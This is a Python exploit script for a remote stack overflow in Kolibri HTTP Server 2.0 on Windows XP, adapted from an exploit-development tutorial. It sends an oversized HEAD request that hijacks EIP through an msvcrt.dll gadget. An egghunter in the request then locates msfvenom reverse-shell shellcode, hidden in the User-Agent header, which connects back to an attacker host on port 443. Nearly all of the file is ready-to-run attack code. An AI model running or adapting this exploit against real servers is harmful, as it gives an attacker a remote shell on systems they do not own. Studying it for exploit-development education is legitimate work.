#!/usr/bin/env python
#-*- coding: utf-8 -*-

###########################################################################
# Exploit Title: Kolibri HTTP Server 2.0 Remote Overflow with Egghunter   #
# Date: 14 April 2018                                                     #
# Adapted from FuzzySecurity.com tutorial by Ryan Saunders                #
# Original exploit: http://fuzzysecurity.com/tutorials/expDev/4.html      #
# Version: 2.0                                                            #
# Tested On: WinXP Professional SP3                                       #
###########################################################################

import socket

target = raw_input("Enter target IP: ")
# Egghunter
# 32 bytes
# tag: f33ff33f

hunter = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
hunter += "\xef\xb8\x66\x33\x33\x66\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

#----------------------------------------------------------------------------------------#
# [*] Exact match at offset 515                                                          #
# Stage1:                                                                                #
#   (1) EIP: 0x77c35459 : push esp # ret  |                                              #
#   {PAGE_EXECUTE_READ} [msvcrt.dll] ASLR: False, Rebase: False, SafeSEH: True, OS: True #
#   v7.0.2600.5512 (C:\WINDOWS\system32\msvcrt.dll)                                      #
#   (2) ESP: 60 bytes back                                                               #
# badchars: \x00\x0d\x0a\x3d\x20\x3f                                                     #
#----------------------------------------------------------------------------------------#

stage1 = "A" * 478 + hunter  + "A" * 5 + "\x59\x54\xc3\x77" + "\xeb\xc4" 

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.110 LPORT=443 EXITFUNC=thread \
# -b "\x00\x0d\x0a\x3d\x20\x3f" -f py -v stage2
stage2 =  "f33ff33f"
stage2 += "\xda\xd3\xd9\x74\x24\xf4\x5f\xb8\x5c\xfa\x25\x96"
stage2 += "\x2b\xc9\xb1\x52\x83\xef\xfc\x31\x47\x13\x03\x1b"
stage2 += "\xe9\xc7\x63\x5f\xe5\x8a\x8c\x9f\xf6\xea\x05\x7a"
stage2 += "\xc7\x2a\x71\x0f\x78\x9b\xf1\x5d\x75\x50\x57\x75"
stage2 += "\x0e\x14\x70\x7a\xa7\x93\xa6\xb5\x38\x8f\x9b\xd4"
stage2 += "\xba\xd2\xcf\x36\x82\x1c\x02\x37\xc3\x41\xef\x65"
stage2 += "\x9c\x0e\x42\x99\xa9\x5b\x5f\x12\xe1\x4a\xe7\xc7"
stage2 += "\xb2\x6d\xc6\x56\xc8\x37\xc8\x59\x1d\x4c\x41\x41"
stage2 += "\x42\x69\x1b\xfa\xb0\x05\x9a\x2a\x89\xe6\x31\x13"
stage2 += "\x25\x15\x4b\x54\x82\xc6\x3e\xac\xf0\x7b\x39\x6b"
stage2 += "\x8a\xa7\xcc\x6f\x2c\x23\x76\x4b\xcc\xe0\xe1\x18"
stage2 += "\xc2\x4d\x65\x46\xc7\x50\xaa\xfd\xf3\xd9\x4d\xd1"
stage2 += "\x75\x99\x69\xf5\xde\x79\x13\xac\xba\x2c\x2c\xae"
stage2 += "\x64\x90\x88\xa5\x89\xc5\xa0\xe4\xc5\x2a\x89\x16"
stage2 += "\x16\x25\x9a\x65\x24\xea\x30\xe1\x04\x63\x9f\xf6"
stage2 += "\x6b\x5e\x67\x68\x92\x61\x98\xa1\x51\x35\xc8\xd9"
stage2 += "\x70\x36\x83\x19\x7c\xe3\x04\x49\xd2\x5c\xe5\x39"
stage2 += "\x92\x0c\x8d\x53\x1d\x72\xad\x5c\xf7\x1b\x44\xa7"
stage2 += "\x90\xe3\x31\xa6\x0e\x8c\x43\xa8\xcf\xf7\xcd\x4e"
stage2 += "\xa5\x17\x98\xd9\x52\x81\x81\x91\xc3\x4e\x1c\xdc"
stage2 += "\xc4\xc5\x93\x21\x8a\x2d\xd9\x31\x7b\xde\x94\x6b"
stage2 += "\x2a\xe1\x02\x03\xb0\x70\xc9\xd3\xbf\x68\x46\x84"
stage2 += "\xe8\x5f\x9f\x40\x05\xf9\x09\x76\xd4\x9f\x72\x32"
stage2 += "\x03\x5c\x7c\xbb\xc6\xd8\x5a\xab\x1e\xe0\xe6\x9f"
stage2 += "\xce\xb7\xb0\x49\xa9\x61\x73\x23\x63\xdd\xdd\xa3"
stage2 += "\xf2\x2d\xde\xb5\xfa\x7b\xa8\x59\x4a\xd2\xed\x66"
stage2 += "\x63\xb2\xf9\x1f\x99\x22\x05\xca\x19\x42\xe4\xde"
stage2 += "\x57\xeb\xb1\x8b\xd5\x76\x42\x66\x19\x8f\xc1\x82"
stage2 += "\xe2\x74\xd9\xe7\xe7\x31\x5d\x14\x9a\x2a\x08\x1a"
stage2 += "\x09\x4a\x19"

request = (
"HEAD /" + stage1 + " HTTP/1.1\r\n"
"Host: " + target + ":8080\r\n"
#"User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; he; rv:1.9.2.12) Gecko/20101026 Firefox/1.3.37\r\n"
"User-Agent:" + stage2 + "\r\n"
"Keep-Alive: 115\r\n"
"Connection: keep-alive\r\n\r\n"
)

try:
    print("[i] Sending payload...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target, 8080))
    s.send(request)
    s.close()
    print("[+] Splash. Standby for shell.")
except:
    print("[-] Could not connect to target.")
